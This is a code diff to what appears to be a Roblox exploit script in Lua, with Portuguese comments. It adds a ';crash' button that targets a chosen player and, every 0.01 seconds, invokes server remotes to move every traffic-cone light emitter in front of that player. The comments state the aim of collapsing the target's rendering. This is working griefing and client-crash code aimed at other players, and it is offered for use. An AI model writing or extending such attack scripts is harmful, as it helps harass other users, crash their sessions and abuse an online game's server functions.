@@ -763,3 +763,41 @@ MainTab:Button({
        end
    end
 })
+
+MainTab:Button({
+   Title = ";crash",
+   Callback = function()
+       if LoopCrashLuz then return end
+       if not AlvoSelecionado or AlvoSelecionado == "" then return end
+       
+       local targetPlayer = game:GetService("Players"):FindFirstChild(AlvoSelecionado)
+       if not targetPlayer or not targetPlayer.Character or not targetPlayer.Character:FindFirstChild("HumanoidRootPart") then return end
+       
+       local pastaProps = workspace.WorkspaceCom:FindFirstChild("001_TrafficCones")
+       if not pastaProps then return end
+       
+       LoopCrashLuz = true
+       
+       task.spawn(function()
+           while LoopCrashLuz and targetPlayer and targetPlayer.Parent == game:GetService("Players") and targetPlayer.Character and targetPlayer.Character:FindFirstChild("HumanoidRootPart") do
+               local rootAlvo = targetPlayer.Character.HumanoidRootPart
+               local props = pastaProps:GetChildren()
+               if #props == 0 then break end
+               
+               -- Posiciona todos os emissores 5 studs à frente do alvo, apontando a luz direto para o peito dele
+               local posicaoEmissor = rootAlvo.Position + (rootAlvo.CFrame.LookVector * 5) + Vector3.new(0, 2, 0)
+               local destinoLuzCFrame = CFrame.lookAt(posicaoEmissor, rootAlvo.Position)
+               
+               -- Funde todos os emissores no mesmo ponto para colapsar a renderização gráfica do alvo
+               for _, prop in pairs(props) do
+                   local remoto = prop:FindFirstChild("SetCurrentCFrame")
+                   if remoto and remoto:IsA("RemoteFunction") then
+                       task.spawn(function() pcall(function() remoto:InvokeServer(destinoLuzCFrame) end) end)
+                   end
+               end
+               task.wait(0.01) -- Velocidade máxima de atualização para inundar o pipeline de renderização
+           end
+           LoopCrashLuz = false
+       end)
+   end
+})
